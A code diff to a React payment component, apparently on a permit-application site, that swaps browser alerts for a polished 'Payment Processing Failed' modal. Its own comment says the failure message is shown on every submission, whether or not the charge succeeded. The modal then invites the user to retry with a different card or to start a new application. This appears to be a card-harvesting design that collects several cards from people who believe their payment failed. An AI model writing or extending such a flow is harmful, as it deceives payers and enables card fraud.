@@ -8,6 +8,8 @@ const SecurePayment = () => {
   const [applicationNumber, setApplicationNumber] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
   const [hasError, setHasError] = useState(false);
+  const [showErrorModal, setShowErrorModal] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
   const [paymentData, setPaymentData] = useState({
     cardNumber: '',
     expiryMonth: '',
@@ -84,11 +86,13 @@ const SecurePayment = () => {
       const data = await response.json();
 
       // Always show the error message from backend, regardless of success/failure
-      alert(data.message || 'There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
+      setErrorMessage(data.message || 'There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
+      setShowErrorModal(true);
       
     } catch (error) {
       console.error('Payment submission error:', error);
-      alert('There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
+      setErrorMessage('There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
+      setShowErrorModal(true);
     } finally {
       setIsProcessing(false);
     }
@@ -503,6 +507,72 @@ const SecurePayment = () => {
             </div>
           </div>
         </div>
+        )}
+
+        {/* Error Modal */}
+        {showErrorModal && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+            <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl max-w-md w-full mx-4 transform transition-all duration-300">
+              <div className="p-6">
+                {/* Modal Header */}
+                <div className="flex items-center justify-center mb-6">
+                  <div className="w-16 h-16 bg-red-100 dark:bg-red-900/30 rounded-full flex items-center justify-center">
+                    <svg className="w-8 h-8 text-red-600 dark:text-red-400" fill="currentColor" viewBox="0 0 20 20">
+                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+                    </svg>
+                  </div>
+                </div>
+
+                {/* Modal Title */}
+                <h3 className="text-2xl font-bold text-gray-900 dark:text-white text-center mb-4">
+                  Payment Processing Failed
+                </h3>
+
+                {/* Modal Content */}
+                <div className="text-center mb-8">
+                  <p className="text-gray-600 dark:text-gray-300 text-lg leading-relaxed">
+                    {errorMessage}
+                  </p>
+                </div>
+
+                {/* Modal Actions */}
+                <div className="flex flex-col sm:flex-row gap-3">
+                  <button
+                    onClick={() => setShowErrorModal(false)}
+                    className="flex-1 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-gray-200 font-semibold py-3 px-6 rounded-xl transition-colors duration-200"
+                  >
+                    Try Again
+                  </button>
+                  <button
+                    onClick={() => {
+                      setShowErrorModal(false);
+                      window.location.href = '/apply-permit';
+                    }}
+                    className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-xl transition-colors duration-200"
+                  >
+                    New Application
+                  </button>
+                </div>
+
+                {/* Support Note */}
+                <div className="mt-6 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-xl">
+                  <div className="flex items-start">
+                    <svg className="w-5 h-5 text-blue-600 dark:text-blue-400 mt-0.5 mr-3 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                      <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
+                    </svg>
+                    <div>
+                      <p className="text-sm font-medium text-blue-800 dark:text-blue-200 mb-1">
+                        Need Help?
+                      </p>
+                      <p className="text-sm text-blue-700 dark:text-blue-300">
+                        Our support team will contact you via email to assist with payment processing if needed.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
         )}
       </div>
     </div>
